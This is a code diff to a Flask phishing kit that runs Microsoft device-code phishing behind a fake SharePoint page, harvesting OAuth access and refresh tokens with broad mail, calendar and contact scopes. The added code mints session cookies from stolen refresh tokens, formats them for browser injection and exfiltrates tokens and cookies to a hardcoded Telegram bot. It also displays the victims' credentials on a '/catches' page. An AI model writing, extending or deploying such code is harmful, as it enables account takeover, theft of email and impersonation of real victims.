@@ -2,6 +2,7 @@ import os
 import json
 import time
 import base64
+import uuid
 import sqlite3
 import threading
 import signal
@@ -13,25 +14,21 @@ TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT = "8877118461"
 DB_PATH = "/tmp/phish.db"
 
-CID_LOCK = threading.Lock()
+CLIENT_IDS = [
+    "27922004-5251-4030-b22d-91ecd9a37ea4",  # Outlook Mobile (confirmed working)
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
+    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
+    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
+]
 CLIENT_ID_INDEX = 0
 
-CLIENT_IDS = [
-    "1950a258-227b-4e31-a9cf-717495945fc2",  # Microsoft Azure PowerShell
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Microsoft Azure CLI
-    "844cca35-0656-46ce-9655-e597c06d2d1d",  # Microsoft Azure Storage Explorer
-    "1b730954-1685-4b74-9bfd-dac224a7b894",  # Azure AD PowerShell
-]
+DEVICE_CODE_SCOPE = "https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/MailboxSettings.ReadWrite https://graph.microsoft.com/Calendars.ReadWrite https://graph.microsoft.com/Contacts.ReadWrite https://graph.microsoft.com/User.ReadWrite offline_access openid profile"
 
-# Explicit Graph delegated scopes so the harvested token works for mail reading.
-# CLIENT_IDS are rotated automatically if Microsoft returns 65002 / unauthorized_client.
-DEVICE_CODE_SCOPE = (
-    "https://graph.microsoft.com/Mail.ReadWrite "
-    "https://graph.microsoft.com/Mail.Send "
-    "https://graph.microsoft.com/MailboxSettings.ReadWrite "
-    "https://graph.microsoft.com/User.Read "
-    "offline_access openid profile"
-)
+COOKIE_WANTED = [
+    "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
+    "SignInStateCookie", "x-ms-gateway-suitename", "ESTSAUTHHPERSISTENT",
+    "brcap", "fpc", "esctx", "cltm", "x-ms-cpim-sso",
+]
 
 app = Flask(__name__)
 shutdown_event = threading.Event()
@@ -49,8 +46,13 @@ def init_db():
         status TEXT,
         email TEXT,
         tokens TEXT,
+        cookies TEXT,
         ts TEXT
     )""")
+    # upgrade older DBs that lack the cookies column
+    cols = [r[1] for r in con.execute("PRAGMA table_info(sessions)").fetchall()]
+    if "cookies" not in cols:
+        con.execute("ALTER TABLE sessions ADD COLUMN cookies TEXT")
     con.commit()
     con.close()
 
@@ -116,54 +118,25 @@ def send_telegram_file(filename, content, caption=""):
 
 # ---------- Device code flow ----------
 def request_device_code():
-    """Returns (client_id, data, error). Exactly one of data/error is set."""
     global CLIENT_ID_INDEX
-    last_error = None
-
     for _ in range(len(CLIENT_IDS)):
-        with CID_LOCK:
-            client_id = CLIENT_IDS[CLIENT_ID_INDEX]
-
-        url = f"{UPSTREAM}/common/oauth2/v2.0/devicecode"
-        payload = {
-            "client_id": client_id,
-            "scope": DEVICE_CODE_SCOPE,
-        }
-
+        client_id = CLIENT_IDS[CLIENT_ID_INDEX]
         try:
-            resp = requests.post(url, data=payload, timeout=10)
-
-            try:
-                data = resp.json()
-            except ValueError:
-                data = {}
-
-            if "error" in data or not data.get("device_code"):
-                err = str(data.get("error", ""))
-                desc = str(data.get("error_description", ""))
-                # Rotate to the next client ID when Microsoft says this app
-                # is not preauthorized for Graph (AADSTS65002) or is unknown.
-                if (
-                    err in ("unauthorized_client", "invalid_client", "invalid_request")
-                    or "65002" in desc
-                    or "AADSTS" in desc
-                ):
-                    with CID_LOCK:
-                        CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
-                    last_error = desc or err or f"HTTP {resp.status_code}"
-                    continue
-
-                return client_id, None, desc or err or "Unexpected device code response"
-
-            return client_id, data, None
-
-        except Exception as e:
-            with CID_LOCK:
+            resp = requests.post(
+                f"{UPSTREAM}/common/oauth2/v2.0/devicecode",
+                data={"client_id": client_id, "scope": DEVICE_CODE_SCOPE},
+                timeout=20
+            )
+            data = resp.json()
+            if resp.status_code == 200 and "device_code" in data:
+                return client_id, data
+            else:
+                print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
                 CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
-            last_error = str(e)
-            continue
-
-    return None, None, f"All client IDs failed. Last error: {last_error}"
+        except Exception as e:
+            print(f"[SESSION] client_id {client_id} exception: {e}")
+            CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
+    return None, None
 
 def decode_id_token(id_token):
     try:
@@ -173,6 +146,77 @@ def decode_id_token(id_token):
         return data.get("preferred_username") or data.get("email") or data.get("upn") or "unknown"
     except Exception:
         return "unknown"
+
+# ---------- Cookie minting ----------
+def get_victim_cookies(refresh_token, client_id, email):
+    """Exchange the refresh token, then hit /authorize so MS sets ESTSAUTH
+    cookies on our server-side session. Returns dict of cookie name->value."""
+    try:
+        s = requests.Session()
+        s.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
+        })
+        # Step 1: refresh token -> new tokens (same client_id that issued it)
+        r = s.post(
+            f"{UPSTREAM}/common/oauth2/v2.0/token",
+            data={
+                "client_id": client_id,
+                "grant_type": "refresh_token",
+                "refresh_token": refresh_token,
+                "scope": DEVICE_CODE_SCOPE,
+            },
+            timeout=25,
+        )
+        data = r.json()
+        if "access_token" not in data:
+            print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
+            return None
+
+        # Step 2: SSO authorize round-trip so login.microsoftonline.com
+        # issues ESTSAUTH / ESTSAUTHPERSISTENT etc. onto this session
+        nonce = uuid.uuid4().hex
+        auth_url = (
+            f"{UPSTREAM}/common/oauth2/authorize?"
+            f"client_id={client_id}&response_type=id_token"
+            f"&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient"
+            f"&scope=openid&response_mode=form_post&nonce={nonce}"
+            f"&login_hint={email}"
+        )
+        s.get(auth_url, timeout=25, allow_redirects=True)
+
+        cookies = {}
+        for c in s.cookies:
+            if c.name in COOKIE_WANTED and c.value:
+                cookies[c.name] = c.value
+        if not cookies:
+            print("[COOKIES] no wanted cookies captured")
+            return None
+        print(f"[COOKIES] captured {len(cookies)} cookies")
+        return cookies
+    except Exception as e:
+        print(f"[COOKIES] exception: {e}")
+        return None
+
+def format_cookies_text(cookies, email):
+    lines = [f" COOKIE SESSION - {email}", "Domain: login.microsoftonline.com", ""]
+    for name, value in cookies.items():
+        lines.append(f"{name}={value}")
+    return "\n".join(lines)
+
+def format_cookie_editor_json(cookies):
+    """Cookie-Editor import format for one-click injection."""
+    out = []
+    for name, value in cookies.items():
+        out.append({
+            "domain": "login.microsoftonline.com",
+            "name": name,
+            "path": "/",
+            "value": value,
+            "secure": True,
+            "httpOnly": True,
+            "sameSite": "no_restriction",
+        })
+    return json.dumps(out, indent=2)
 
 # ---------- Worker ----------
 def poll_worker():
@@ -205,22 +249,42 @@ def poll_worker():
                         "access_token": data.get("access_token"),
                         "refresh_token": data.get("refresh_token"),
                         "id_token": data.get("id_token"),
-                        "scope": data.get("scope"),
                     }
-                    db_update_session(sid, status="caught", email=email, tokens=json.dumps(tokens))
+                    # Mint victim cookies from the refresh token
+                    cookies = get_victim_cookies(tokens["refresh_token"], client_id, email)
+                    if cookies:
+                        db_update_session(sid, status="caught", email=email,
+                                          tokens=json.dumps(tokens), cookies=json.dumps(cookies))
+                    else:
+                        db_update_session(sid, status="caught", email=email,
+                                          tokens=json.dumps(tokens), cookies="{}")
+
                     msg = (f"\U0001F3C6 New catch!\n"
                            f"Email: {email}\n"
                            f"Session: {sid}\n"
-                           f"Scope: {tokens['scope']}\n\n"
                            f"Access Token:\n{tokens['access_token']}\n\n"
                            f"Refresh Token:\n{tokens['refresh_token']}\n\n"
                            f"ID Token:\n{tokens['id_token']}")
+
+                    if cookies:
+                        msg += ("\n\n\u2705 SESSION COOKIES (domain login.microsoftonline.com):\n"
+                                + format_cookies_text(cookies, email))
+                        msg += ("\n\n\u2192 Paste into Cookie-Editor on login.microsoftonline.com, "
+                                "then open outlook.office.com/mail")
+
                     if len(msg) > 4000:
-                        send_telegram(f"\U0001F3C6 New catch! Email: {email} (tokens attached)")
-                        send_telegram_file("tokens.txt", json.dumps(tokens, indent=2), f"Catch for {email}")
+                        send_telegram(f"\U0001F3C6 New catch! Email: {email} (tokens + cookies attached)")
+                        send_telegram_file("tokens.txt", json.dumps(tokens, indent=2), f"Tokens for {email}")
+                        if cookies:
+                            send_telegram_file("cookies.json", format_cookie_editor_json(cookies),
+                                               f"Cookie-Editor import for {email} -> login.microsoftonline.com")
                     else:
                         send_telegram(msg)
-                    print(f"[WORKER] session {sid} caught email={email}")
+                        if cookies:
+                            send_telegram_file("cookies.json", format_cookie_editor_json(cookies),
+                                               f"Cookie-Editor import for {email} -> login.microsoftonline.com")
+
+                    print(f"[WORKER] session {sid} caught email={email} cookies={'yes' if cookies else 'no'}")
                 elif data.get("error") == "authorization_pending":
                     pass
                 elif data.get("error") == "slow_down":
@@ -236,6 +300,7 @@ def poll_worker():
         shutdown_event.wait(timeout=3)
     print("[WORKER] poll_worker stopped")
 
+# Start worker exactly once, safe under Gunicorn import
 _worker_started = False
 def start_worker():
     global _worker_started
@@ -249,14 +314,10 @@ start_worker()
 def _shutdown(sig, frame):
     shutdown_event.set()
 
-try:
-    signal.signal(signal.SIGTERM, _shutdown)
-    signal.signal(signal.SIGINT, _shutdown)
-except ValueError:
-    # Not running in the main thread (some WSGI servers); skip signal wiring.
-    pass
+signal.signal(signal.SIGTERM, _shutdown)
+signal.signal(signal.SIGINT, _shutdown)
 
-# ---------- Page (SharePoint style) ----------
+# ---------- Page (SharePoint style — your landing page, unchanged) ----------
 def render_page(user_code, verify_url):
     return f"""<!DOCTYPE html>
 <html lang="en">
@@ -388,15 +449,14 @@ function go() {{
 # ---------- Routes ----------
 @app.route("/", methods=["GET"])
 def home():
-    client_id, data, err = request_device_code()
+    client_id, data = request_device_code()
     if not data:
-        print(f"[SESSION] device code failed: {err}")
         return "<h2>Service temporarily unavailable, please retry.</h2>", 503
     sid = db_add_session(
         data["device_code"], data["user_code"], client_id,
         data.get("interval", 5), time.time() + int(data.get("expires_in", 900))
     )
-    print(f"[SESSION] new session {sid} user_code={data['user_code']} cid={client_id[:8]}")
+    print(f"[SESSION] new session {sid} user_code={data['user_code']}")
     return Response(render_page(data["user_code"], data["verification_uri"]), mimetype="text/html")
 
 @app.route("/test_tg", methods=["GET"])
@@ -407,13 +467,53 @@ def test_tg():
 @app.route("/catches", methods=["GET"])
 def catches():
     con = sqlite3.connect(DB_PATH)
-    rows = con.execute("SELECT id, email, status, ts FROM sessions ORDER BY id DESC LIMIT 50").fetchall()
+    rows = con.execute(
+        "SELECT id, email, tokens, cookies, ts FROM sessions WHERE status='caught' ORDER BY id DESC LIMIT 20"
+    ).fetchall()
     con.close()
-    out = "<h2>Recent sessions</h2><table border=1 cellpadding=6><tr><th>ID</th><th>Email</th><th>Status</th><th>Time</th></tr>"
-    for r in rows:
-        out += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td></tr>"
-    out += "</table>"
-    return out
+
+    html = """<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Catches</title>
+<style>
+body { font-family: 'Segoe UI', sans-serif; background: #faf9f8; padding: 24px; }
+h1 { color: #0078d4; }
+.card { background: white; border: 1px solid #e1dfdd; border-radius: 8px; padding: 16px; margin-bottom: 16px; box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13); }
+.email { font-weight: 700; color: #005a9e; font-size: 16px; }
+.ts { color: #a19f9d; font-size: 12px; }
+pre { background: #f3f2f1; padding: 10px; border-radius: 4px; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
+details { margin: 6px 0; }
+summary { cursor: pointer; font-weight: 600; color: #323130; }
+</style></head><body>
+<h1>Caught Sessions (last 20)</h1>"""
+
+    if not rows:
+        html += "<p>No catches yet.</p>"
+
+    for sid, email, tokens, cookies, ts in rows:
+        html += f'<div class="card"><div class="email">#{sid} — {email}</div>'
+        html += f'<div class="ts">{ts}</div>'
+        try:
+            t = json.loads(tokens or "{}")
+            html += '<details><summary>Access Token</summary><pre>'
+            html += (t.get("access_token") or "none") + '</pre></details>'
+            html += '<details><summary>Refresh Token</summary><pre>'
+            html += (t.get("refresh_token") or "none") + '</pre></details>'
+            html += '<details><summary>ID Token</summary><pre>'
+            html += (t.get("id_token") or "none") + '</pre></details>'
+        except Exception:
+            html += "<p>Token parse error</p>"
+        try:
+            c = json.loads(cookies or "{}")
+            if c:
+                cookie_str = "; ".join(f"{k}={v}" for k, v in c.items())
+                html += f'<details><summary>Cookies ({len(c)})</summary><pre>{cookie_str}</pre></details>'
+        except Exception:
+            pass
+        html += "</div>"
+
+    html += "</body></html>"
+    return Response(html, mimetype="text/html")
+
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
